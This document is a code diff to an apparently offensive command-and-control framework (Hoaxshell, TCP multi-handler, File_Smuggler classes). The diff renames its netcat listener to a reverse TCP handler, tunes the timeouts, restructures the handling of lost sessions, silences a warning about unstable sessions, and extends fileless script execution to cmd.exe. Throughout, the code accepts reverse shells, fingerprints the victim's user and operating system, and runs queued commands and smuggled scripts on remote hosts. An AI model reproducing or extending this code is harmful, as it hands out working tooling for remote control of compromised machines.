@@ -117,7 +117,7 @@ class Payload_Generator:
 
 
 
-	def compute_netcat(self, payload, user_args):
+	def compute_reverse_tcp_payload(self, payload, user_args):
 
 		# Set lhost port
 		lport = TCP_Sock_Handler_Settings.bind_port
@@ -228,8 +228,8 @@ class Payload_Generator:
 			if payload.meta['handler'] == 'hoaxshell':
 				self.compute_hoaxshell(payload, args_dict)
 
-			elif payload.meta['handler'] == 'netcat':
-				self.compute_netcat(payload, args_dict)
+			elif payload.meta['handler'] == 'reverse tcp':
+				self.compute_reverse_tcp_payload(payload, args_dict)
 
 		except:
 
@@ -916,7 +916,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 					if cmd_list[0] == 'clear':
 						os.system('clear')
-						if listener == 'netcat':
+						if listener == 'reverse tcp':
 							if is_remote_shell:
 								Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, '')
 							else:
@@ -964,7 +964,11 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 						execution_object = cmd_list[1]
 						shell_type = Sessions_Manager.active_sessions[session_id]['Shell']
-						
+
+						if shell_type not in File_Smuggler.Utilities['fileless_exec']['supported']:
+							print(f'\r[{INFO}] Script execution not supported for shell type "{shell_type}"')
+							continue
+
 						if execution_object[0] in [os.sep, '~']:
 							file_path = os.path.expanduser(execution_object)
 							is_file = True if os.path.isfile(file_path) else False
@@ -990,13 +994,13 @@ class Hoaxshell(BaseHTTPRequestHandler):
 						# Check the session's stability and warn user
 						approved = True
 
-						if Sessions_Manager.return_session_attr_value(session_id, 'Stability') == 'Unstable':
-							try:
-								choice = input(f'\r[{WARN}] This session is unstable. Running I/O-intensive commands may cause it to hang. Proceed? [y/n]: ')
-								approved = True if choice.lower().strip() in ['yes', 'y'] else False
-							except:
-								print()
-								approved = False
+						# if Sessions_Manager.return_session_attr_value(session_id, 'Stability') == 'Unstable':
+						# 	try:
+						# 		choice = input(f'\r[{WARN}] This session is unstable. Running I/O-intensive commands may cause it to hang. Proceed? [y/n]: ')
+						# 		approved = True if choice.lower().strip() in ['yes', 'y'] else False
+						# 	except:
+						# 		print()
+						# 		approved = False
 
 						if approved:
 							# Check who is the owner of the shell session
@@ -1205,12 +1209,12 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			try:
 				Sessions_Manager.active_sessions[session_id]['Computername'] = url_split[1]
 				Sessions_Manager.active_sessions[session_id]['Username'] = url_split[2]
-				print_to_prompt(f'\r[{GREEN}Shell{END}][{session_id}] New session established -> {ORANGE}{self.client_address[0]}{END} at {get_datetime()}.')
+				print_to_prompt(f'\r[{GREEN}Shell{END}] {session_id} - New session established -> {ORANGE}{self.client_address[0]}{END} at {get_datetime()}.')
 
 			except IndexError:
 				Sessions_Manager.active_sessions[session_id]['Computername'] = 'Undefined'
 				Sessions_Manager.active_sessions[session_id]['Username'] = 'Undefined'
-				print_to_prompt(f'\r[{GREEN}Shell{END}][{session_id}] New session established -> {ORANGE}{self.client_address[0]}{END} at {get_datetime()} (hostname and user undefined).')
+				print_to_prompt(f'\r[{GREEN}Shell{END}] {session_id} - New session established -> {ORANGE}{self.client_address[0]}{END} at {get_datetime()} (hostname and user undefined).')
 		   	 
 			try:
 				Thread(target = self.monitor_shell_state, args = (session_id,), name = f'session_state_monitor_{self.client_address[0]}', daemon = True).start()
@@ -1380,7 +1384,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			elif os_type == 'Windows' and outfile:
 				Hoaxshell.command_pool[session_id].append({'data' : 'quit', 'issuer' : 'self', 'quiet' : True})
 
-		elif Sessions_Manager.active_sessions[session_id]['Listener'] == 'netcat':
+		elif Sessions_Manager.active_sessions[session_id]['Listener'] == 'reverse tcp':
 			Hoaxshell.command_pool[session_id].append({'data' : 'exit', 'issuer' : 'self', 'quiet' : True})
 
 
@@ -1750,7 +1754,7 @@ class Core_Server:
 						new_session_id = decrypted_data[1]['session_id']
 						decrypted_data[1].pop('session_id', None)
 						Sessions_Manager.active_sessions[new_session_id] = decrypted_data[1]
-						print_to_prompt(f'\r[{GREEN}Shell{END}][{new_session_id}] New session established -> {ORANGE}{Sessions_Manager.active_sessions[new_session_id]["IP Address"]}{END} at {get_datetime()} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END}).')
+						print_to_prompt(f'\r[{GREEN}Shell{END}][{new_session_id}] - New session established -> {ORANGE}{Sessions_Manager.active_sessions[new_session_id]["IP Address"]}{END} at {get_datetime()} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END}).')
 						del decrypted_data, new_session_id
 						Core_Server.send_msg(conn, self.response_ack(sibling_id))
 
@@ -2394,16 +2398,16 @@ class Core_Server:
 
 class TCP_Sock_Multi_Handler:
 
-	server_name = 'Netcat TCP Multi-Handler'
+	server_name = 'Reverse TCP Multi-Handler'
 	listen = True
 	listener_initialized = None
 
 	def initiate_nc_listener(self):
 
 		try:
-			nc_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			nc_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-			nc_server.bind((TCP_Sock_Handler_Settings.bind_address, TCP_Sock_Handler_Settings.bind_port))
+			tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			tcp_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+			tcp_server.bind((TCP_Sock_Handler_Settings.bind_address, TCP_Sock_Handler_Settings.bind_port))
 
 		except OSError:
 			self.listener_initialized = False
@@ -2421,12 +2425,12 @@ class TCP_Sock_Multi_Handler:
 		print(f'\r[{ORANGE}{TCP_Sock_Handler_Settings.bind_address}{END}:{ORANGE}{TCP_Sock_Handler_Settings.bind_port}{END}]::{self.server_name}')
 
 		# Start listening for connections
-		nc_server.listen()
+		tcp_server.listen()
 
 		while self.listen:
-			conn, address = nc_server.accept()
+			conn, address = tcp_server.accept()
 			iface = conn.getsockname()[0]
-			socket_server = Thread(target = self.nc_shell_handler, args = (conn, address, iface), name = f'tcp_socket_shell_{address[0]}').start()
+			sock_t = Thread(target = self.shell_reverse_tcp_handler, args = (conn, address, iface), name = f'tcp_reverse_shell_{address[0]}').start()
 			sleep(0.1)
 
 
@@ -2466,7 +2470,7 @@ class TCP_Sock_Multi_Handler:
 
 			# Desperate attempt to specify if Win or Unix
 			conn.sendall('{}\n'.format('uname').encode('utf-8'))
-			res = self.recv_timeout(conn, quiet = True, timeout = 2)
+			res = self.recv_timeout(conn, quiet = True, timeout = 5)
 			if re.search('Linux', res):
 				return [True, 'Linux', 'unix'] 
 			elif re.search("The term 'uname' is not recognized", res):
@@ -2482,7 +2486,7 @@ class TCP_Sock_Multi_Handler:
 
 
 
-	def nc_shell_handler(self, conn, address, iface):
+	def shell_reverse_tcp_handler(self, conn, address, iface):
 
 		Threading_params.thread_limiter.acquire()
 
@@ -2498,7 +2502,6 @@ class TCP_Sock_Multi_Handler:
 			hostname_undefined = False
 			username = ''
 			ident_stat = True
-			broken_pipe = 0
 			init_response = ''
 
 			try:
@@ -2508,34 +2511,28 @@ class TCP_Sock_Multi_Handler:
 					init_response += init_res_data
 			
 				whoami = conn.sendall('{}\n'.format('whoami').encode('utf-8'))
-				res = self.recv_timeout(conn, quiet = True, timeout = 3)	 
+				res = self.recv_timeout(conn, quiet = True, timeout = 5)	 
 				username = self.dehash_prompt(self.clean_nc_response(res))
 				init_response += res
 
 				# Capture a prompt value
 				pv = conn.sendall('{}\n'.format('').encode('utf-8'))
-				prompt_val = self.recv_timeout(conn, quiet = True, timeout = 2)
+				prompt_val = self.recv_timeout(conn, quiet = True, timeout = 5)
 
 				# Try to fingerprint OS
 				os_fingerprint = self.os_fingerprint(init_response, prompt_val, conn)
 
-				# Characterize OS and shell type
+				# Fingerprint OS and shell type
 				if not os_fingerprint:
 					ident_stat = 'Unresponsive'
 				else:
 					os_type, shell = os_fingerprint[1], os_fingerprint[2]
 
 			except BrokenPipeError:
-
-				if broken_pipe <= 1:
-					broken_pipe += 1
-
-				else:
 					ident_stat = 'BrokenPipeError'
 
 			if username in ['ConnectionResetError']:
 				ident_stat = 'ConnectionResetError'
-
 
 			if isinstance(ident_stat, str):
 				conn.close()
@@ -2561,7 +2558,7 @@ class TCP_Sock_Multi_Handler:
 					username = username.split('\n')[0].strip()
 				
 				conn.sendall('{}\n'.format('echo "***$(hostname)***"').encode('utf-8')) 
-				response = self.recv_timeout(conn, quiet = True, timeout = 3) 
+				response = self.recv_timeout(conn, quiet = True, timeout = 5) 
 				response = self.remove_non_print(self.clean_nc_response(response))
 				# Remove command echo if detected
 				response = response.split('***$(hostname)***')[-1] if re.search(re.escape('***$(hostname)***'), response) else response
@@ -2598,7 +2595,7 @@ class TCP_Sock_Multi_Handler:
 				'execution_verified' : True,
 				'Computername' : hostname.strip(' \n\r'),
 				'Username' : username.strip(' \n\r'),
-				'Listener' : 'netcat',
+				'Listener' : 'reverse tcp',
 				'Shell' : shell,
 				'iface' : iface,
 				'prompt' : '',
@@ -2615,7 +2612,7 @@ class TCP_Sock_Multi_Handler:
 			}
 
 			Hoaxshell.command_pool[session_id] = []
-			print_to_prompt(f'\r[{GREEN}Shell{END}][{session_id}] New session established -> {ORANGE}{address[0]}{END} at {get_datetime()}.')
+			print_to_prompt(f'\r[{GREEN}Shell{END}] {session_id} - New session established -> {ORANGE}{address[0]}{END} at {get_datetime()}.')
 			print_to_prompt(f'\r[{WARN}] Failed to resolve hostname. Use "repair" to declare it manually.') if hostname_undefined else do_nothing()
 
 			new_session_data = deepcopy(Sessions_Manager.active_sessions[session_id])
@@ -2639,7 +2636,6 @@ class TCP_Sock_Multi_Handler:
 		while True:
 	   	 
 			sessions = clone_dict_keys(Sessions_Manager.active_sessions)
-			villain_issued_cmd = False
 
 			if session_id in sessions:
 		   	 
@@ -2655,6 +2651,7 @@ class TCP_Sock_Multi_Handler:
 				if Hoaxshell.command_pool[session_id]:
 
 					cmd = Hoaxshell.command_pool[session_id].pop(0)
+					villain_issued_cmd = False
 
 					# issuer = 'self' if session_id == Hoaxshell.active_shell else None
 					# if session_id in Sessions_Manager.shell_redirectors.keys():
@@ -2687,34 +2684,30 @@ class TCP_Sock_Multi_Handler:
 							raise ConnectionResetError
 						
 						conn.sendall('{}\n'.format(cmd).encode('utf-8'))
-
-						if session_id in Sessions_Manager.sessions_graveyard and \
-						session_id not in Sessions_Manager.active_sessions.keys():
-							break
 				   	 
 						# Read response
 						self.recv_bulk(conn, shell_type = shell, quiet = quiet, \
 							session_id = session_id, prompt = prompt, echo = cmd_echo, issuer = issuer,\
 							timeout = TCP_Sock_Handler_Settings.recv_timeout if prompt else 12)
 
-					except:
+						if session_id in Sessions_Manager.sessions_graveyard and \
+						session_id not in Sessions_Manager.active_sessions.keys():
+							break
 
-						Sessions_Manager.active_sessions[session_id]['Status'] = 'Lost'
-						status = f'{LRED}Lost{END}'
-						Core_Server.announce_shell_session_stat_update({'session_id' : session_id, 'Status' : Sessions_Manager.active_sessions[session_id]['Status']})
-						print(f'\r[{INFO}] Connection with shell session {ORANGE}{session_id}{END} seems to be {status}.') if session_id not in Sessions_Manager.sessions_graveyard \
-						else do_nothing()
-						Core_Server.restore_prompt_after_lost_conn(session_id)
-						return
-
-					if session_id in Sessions_Manager.active_sessions.keys():
 						if Sessions_Manager.active_sessions[session_id]['Status'] != 'Active':
 							Sessions_Manager.active_sessions[session_id]['Status'] = 'Active'
 							Core_Server.announce_shell_session_stat_update({'session_id' : session_id, 'Status' : Sessions_Manager.active_sessions[session_id]['Status']})
 							print(f'\r[{INFO}] Connection with shell session {ORANGE}{session_id}{END} restored!')
 							Core_Server.restore_prompt_after_lost_conn(session_id)
 
-					del cmd
+						del cmd
+
+					except:
+
+						Sessions_Manager.active_sessions[session_id]['Status'] = 'Lost'
+						Core_Server.announce_shell_session_stat_update({'session_id' : session_id, 'Status' : Sessions_Manager.active_sessions[session_id]['Status']})
+						print(f'\r[{INFO}] Connection with shell session {ORANGE}{session_id}{END} seems to be {LRED}Lost{END}.') if session_id not in Sessions_Manager.sessions_graveyard else do_nothing()
+						Core_Server.restore_prompt_after_lost_conn(session_id)
 
 				else:
 					sleep(0.1)
@@ -2804,7 +2797,6 @@ class TCP_Sock_Multi_Handler:
 			# if ((not shell_type) and (response and (time() - begin) > timeout)):
 			if ((time() - begin) > timeout):
 				Core_Server.send_receive_one_encrypted(issuer, ['', '', session_id, True], 'command_output', 30) if issuer != 'self' else do_nothing()
-				#quiet = True
 				break
 	   	 
 			if (time() - (begin + exec_timeout) > timeout):
@@ -2816,7 +2808,7 @@ class TCP_Sock_Multi_Handler:
 				# Receive response data chunk
 				data = sock.recv(TCP_Sock_Handler_Settings.recv_timeout_buffer_size)
 				# print(f'{total_packets} {repr(data)}')
-				if data:
+				if data.strip():
 
 					chunk = data.decode('utf-8', 'ignore')
 					total_packets += 1
@@ -2829,41 +2821,19 @@ class TCP_Sock_Multi_Handler:
 						#if total_packets < 4 and re.match(re.escape(user_issued_cmd), ''.join(response)):
 							echoed_out = True
 							chunk = chunk.replace(user_issued_cmd, '').lstrip('\n\r')
-
-					if shell_type:
-
-						if not prompt:
-							sentinel_value = [True] if re.search(Exec_Utils.sentinel_value, chunk) else [False]
-						else:
-							sentinel_value = [False]
-				   	 
-						if sentinel_value[0]:
-							if not prompt:
-								chunk = chunk.replace(Exec_Utils.sentinel_value, '')
-
-							if issuer == 'self':
-								print(chunk if shell_type in ['unix', 'zsh'] else f'{GREEN}{chunk}{END}', end = '') if not quiet else do_nothing()
-								response.append(chunk)
-
-							else:
-								Core_Server.send_receive_one_encrypted(issuer, [chunk, '', session_id, True], 'command_output', 30) if prompt \
-								else Core_Server.send_receive_one_encrypted(issuer, [chunk, '', session_id, True], 'command_output', 30)
-
-							break
 			   	 
 					# Output received data
 					if issuer == 'self':
-						print(chunk if shell_type in ['unix', 'zsh'] else f'{GREEN}{chunk}{END}', end = '') if not quiet else do_nothing()
+						print(chunk, end = '') if not quiet else do_nothing()
 						response.append(chunk)
-
 					else:
 						Core_Server.send_receive_one_encrypted(issuer, [chunk, '', session_id, False], 'command_output', 30)
 
 					timeout = 0.3
-					sleep(0.15)
+					sleep(0.1)
 
 				else:
-					sleep(0.15)
+					sleep(0.1)
 
 			except ConnectionResetError:
 
@@ -3282,7 +3252,7 @@ class File_Smuggler:
 
 	Utilities = {
 		'fileless_exec' : {
-			'supported' : ['powershell.exe', 'unix', 'zsh']
+			'supported' : ['powershell.exe', 'unix', 'zsh', 'cmd.exe']
 		},
 		'upload' : {
 			'supported' : ['powershell.exe', 'unix', 'zsh', 'cmd.exe']
@@ -3327,9 +3297,6 @@ class File_Smuggler:
 
 		# Determine shell type
 		shell_type = Sessions_Manager.active_sessions[session_id]['Shell']
-		if shell_type not in File_Smuggler.Utilities['upload']['supported']:
-			File_Smuggler.announce_automatic_cmd_failure(issuer, f'\r[{INFO}] Script execution not supported for shell type "{shell_type}"')
-			return
 
 		try:
 
@@ -3368,9 +3335,6 @@ class File_Smuggler:
 		try:
 			# Determine shell type
 			shell_type = Sessions_Manager.active_sessions[session_id]['Shell']
-			if shell_type not in File_Smuggler.Utilities['fileless_exec']['supported']:
-				File_Smuggler.announce_automatic_cmd_failure(issuer, f'\r[{INFO}] Script execution not supported for shell type "{shell_type}"')
-				return
 
 			# Create smuggle ticket
 			ticket = File_Smuggler.create_smuggle_ticket(file_contents, issuer)
